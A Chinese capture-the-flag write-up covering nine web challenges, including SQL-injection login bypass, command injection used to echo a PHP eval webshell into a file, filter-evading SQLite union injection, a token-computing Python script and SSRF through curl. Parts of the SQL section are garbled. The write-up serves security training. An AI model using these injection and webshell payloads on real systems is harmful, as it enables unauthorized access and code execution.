---
title: "web"
lastmod: 2026-03-26T18:13:28+08:00
draft: false
---
- [multi-headach3](#multi-headach3)
- [strange_login](#strange_login)
- [宇宙的中心是php](#%E5%AE%87%E5%AE%99%E7%9A%84%E4%B8%AD%E5%BF%83%E6%98%AFphp)
- [别笑，你也过不了第二关](#%E5%88%AB%E7%AC%91%E4%BD%A0%E4%B9%9F%E8%BF%87%E4%B8%8D%E4%BA%86%E7%AC%AC%E4%BA%8C%E5%85%B3)
- [DD加速器](#dd%E5%8A%A0%E9%80%9F%E5%99%A8)
- [搞点哦润吉吃吃橘](#%E6%90%9E%E7%82%B9%E5%93%A6%E6%B6%A6%E5%90%89%E5%90%83%E5%90%83%E6%A9%98)
- [白帽小K的故事（1）](#%E7%99%BD%E5%B8%BD%E5%B0%8Fk%E7%9A%84%E6%95%85%E4%BA%8B1)
- [小E的管理系统](#%E5%B0%8Fe%E7%9A%84%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F)
- [mygo](#mygo)

---

# multi-headach3
看眼源代码，发现有index.php

扫描一下，看到robots.txt

打开hidden.php

直接访问

但是BP抓包发现访问不对劲，直接改成正确访问

解决

# strange_login
他都告诉你1=1了，这还不万能密码？

1’or‘1’=‘1

结束

# 宇宙的中心是php
直接查看源代码，发现s3kret.php

打开发现一个php代码

16进制绕过就可以了

# 别笑，你也过不了第二关
看眼源代码，发现好像是js的题目

发现score

直接控制台定义就行了，没什么难的

# DD加速器
发现能加一个；隔断

找一下服务器里面有没有，发现有，但是flag不在这里

输出一下index.php

限制长度为28，可以echo进一个php文件就行

直接webshell

;echo '<?php '>1.php

;echo 'eval('>>1.php

;echo '$_POST[1]);'>>1.php

;echo '?>'>>1.php

找不到flag，看眼变量

phpinfo里面有

# 搞点哦润吉吃吃橘
进去就是登录

直接查看网页源代码就行，里面就有

然后是一个计算token的，用python计算

```cpp
import requests, re, time

def extract_numbers(expr):
    # 简单从字符串里抓三个数字（time, multiplier, xor）
    nums = re.findall(r'0x[0-9a-fA-F]+|\d+', expr)
    return nums

s = requests.Session()  # Session 会自动保留 Cookie
session =".eJxNi0EKgCAQAP-yZy9FanruHyK1mLBpbCsE0d-rW8xxZi6Y10iEJWHYGkneKSOD18ZYq37ykMgSJG8IvrPaOWde_sVZ3280o-31oIBqSriEXMALN1TQDuQSvx2myhXuBzSlKU4.aOdsKQ.u9EO8aNPt3GbkSVN4VHDqMoITQE"
headers = {
    "Cookie": f"session={session}",
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
}
start = s.post("https://eci-2ze5ozcaf7j7ved602pj.cloudeci1.ichunqiu.com:5000/start_challenge", headers=headers,  json={})  # 与页面上的 POST /start_challenge 相同
data = start.json()
expr = data.get("expression")  # e.g. "token = (1759995237 * 48728) ^ 0x230b03"
nums = extract_numbers(expr)

# 处理提取到的数字：nums 里可能是 ['1759995237','48728','0x230b03']
tstamp = int(nums[0])
mult = int(nums[1])
xorv = int(nums[2], 0)   # int(...,0) 支持 0x 前缀的 hex

token = (tstamp * mult) ^ xorv

headers = {
    "Content-Type": "application/json",

    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36"
}

resp = s.post("https://eci-2ze5ozcaf7j7ved602pj.cloudeci1.ichunqiu.com:5000/verify_token", headers=headers, json={"token": token})
print(start.status_code)
print(start.text)
print(resp.status_code)
print(resp.text)
```

第一次抓包的时候有一个set_cookie

使用s = requests.Session()自动保留cookie就可以了

# 白帽小K的故事（1）
进源代码看眼

```cpp
 // TODO：
        // 小岸同学到时候记得把这个函数删掉
        async function fetchload(file) {
            try {
                const res = await fetch('/v1/onload', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                    body: `file=${encodeURIComponent(file)}`
                });
                const data = await res.json();
                if (data.success) {
                    console.log('File content:', data.success);
                } else {
                    console.error('Error loading file:', data.error);
                }
            } catch (e) {
                console.error('Request failed', e);
         
```

发现文件保存在/v1/onload/文件夹下，通过POST方法file参数调用

BP抓个包绕过前端输入个webshell上去就行了

# 小E的管理系统
先试一下哪些过滤了

```cpp
'
=
-
空格
;
#
/
```

小E的管理系统

sql注入

=--#,;/'和空格过滤

`

%0a可以代替空格



5列

union select * from (select group_concat(name) from sqlite_master)a join (select 2)b join (select 3)c join (select 4)d join (select 5)e

显示没有database()函数, 说明不是mysql

测试下其他数据库

1.如果是 SQLite（可能性最高，因轻量且常见于演示系统）：没有 “获取当前数据库名” 的直接函数，但可通过以下函数获取数据库信息：

sqlite_version()：返回 SQLite 版本（如 3.40.1）示例注入语句：1%0aunion%0aselect%0asqlite_version()

2.如果是 PostgreSQL：用 current_database() 替代 database()，用于获取当前数据库名。

3.如果是 Oracle：用 sys_context('userenv', 'db_name') 获取数据库名。

测出来是sqlite

union select * from (select group_concat(name) from sqlite_master)a join (select 2)b join (select 3)c join (select 4)d join (select 5)e

ID=1$BAUNIONABASELECT%0A*%LAFROMI0A(SELECT%0AGROUP2_CONCAT(NAME)%0AFROM%0ASQLITE_MASTER)A%0A]1O1N%0

[HTTPS://ECI-2ZE5XZ38V1904CCRLY3Z.CLOUDECI1.ICHUNGIU.COM:80/QUERY.PHP](HTTPS://ECI-2ZE5XZ38V1904CCRLY3Z.CLOUDECI1.ICHUNGIU.COM:80/QUERY.PHP)

AJOIN%0A(SELECT%0A4)D%0AJOIN%0A(SELECT%0A5)E

ASGLITE_MASTER)A%0AJOIN%BA(SELECT%DA2)B%DAJOIN%DA(SELECT%DA3)C%D

可元素控制台源代码/来源网络



找到node_status,sys_config,sqlite_autoindex_sys_config_1,sqlite_sequence 共4张表

union select * from (select * from node_status)a join (select 2)b join (select 3)c join (select 4)d join (select 5)e

char(被过滤

union select * from node_status

node_status表里没有



union select * from group_concat(select  count(*) from sys_config)a join (select 2)b join (select 3)c join (select 4)d join (select 5)e from sys_config

# mygo
```cpp
<?php
$client_ip = $_SERVER['REMOTE_ADDR'];

// 只允许本地访问
if ($client_ip !== '127.0.0.1' && $client_ip !== '::1') {
    header('HTTP/1.1 403 Forbidden');
    echo "你是外地人，我只要\"本地\"人";
    exit;
}

highlight_file(__FILE__);
if (isset($_GET['soyorin'])) {
    $url = $_GET['soyorin'];

    echo "flag在根目录";
    // 普通请求
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, false); // 直接输出给浏览器
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_BUFFERSIZE, 8192);
    curl_exec($ch);
    curl_close($ch);
    exit;
}

?>
```

![1760578821975-815eb52b-b6f5-4728-a441-9296d2cffdec.png](./img/rQ2-o6y-NdJ_p5Y6/1760578821975-815eb52b-b6f5-4728-a441-9296d2cffdec-759349.png)

直接访问flag.php

看出来是ssrf，所以通过curl获取flag内容。


